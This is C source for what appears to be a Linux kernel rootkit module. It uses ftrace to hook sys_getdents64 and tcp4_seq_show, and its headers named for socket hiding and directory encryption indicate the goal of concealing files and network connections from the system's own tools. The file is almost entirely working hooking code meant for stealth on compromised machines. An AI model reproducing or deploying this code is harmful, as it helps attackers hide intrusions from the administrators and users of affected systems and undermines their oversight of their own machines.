#include "ftrace_hook.h"
#include "directory_encrypt.h"
#include "socket_hiding.h"
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/string.h>

asmlinkage long hooked_getdents64(const struct pt_regs *regs);
asmlinkage int hooked_tcp4_seq_show(struct seq_file *seq, void *v);

extern asmlinkage long (*real_getdents64)(const struct pt_regs *regs);
extern asmlinkage int (*real_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs) {
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    regs->ip = (unsigned long)hook->function;
}

static int resolve_hook_address(struct ftrace_hook *hook) {
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address)
        return -ENOENT;
    *((unsigned long *)hook->original) = hook->address;
    return 0;
}

int fh_install_hook(struct ftrace_hook *hook) {
    int err;
    err = resolve_hook_address(hook);
    if (err)
        return err;
    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE | FTRACE_OPS_FL_IPMODIFY;
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err)
        return err;
    err = register_ftrace_function(&hook->ops);
    if (err) {
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }
    return 0;
}

void fh_remove_hook(struct ftrace_hook *hook) {
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
}

static struct ftrace_hook hooks[] = {
    HOOK("sys_getdents64", hooked_getdents64, &real_getdents64),
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &real_tcp4_seq_show),
};

int fh_install_hooks(void) {
    int i, err;
    for (i = 0; i < ARRAY_SIZE(hooks); i++) {
        err = fh_install_hook(&hooks[i]);
        if (err)
            goto error;
    }
    return 0;
error:
    while (i--)
        fh_remove_hook(&hooks[i]);
    return err;
}

void fh_remove_hooks(void) {
    int i;
    for (i = 0; i < ARRAY_SIZE(hooks); i++)
        fh_remove_hook(&hooks[i]);
}
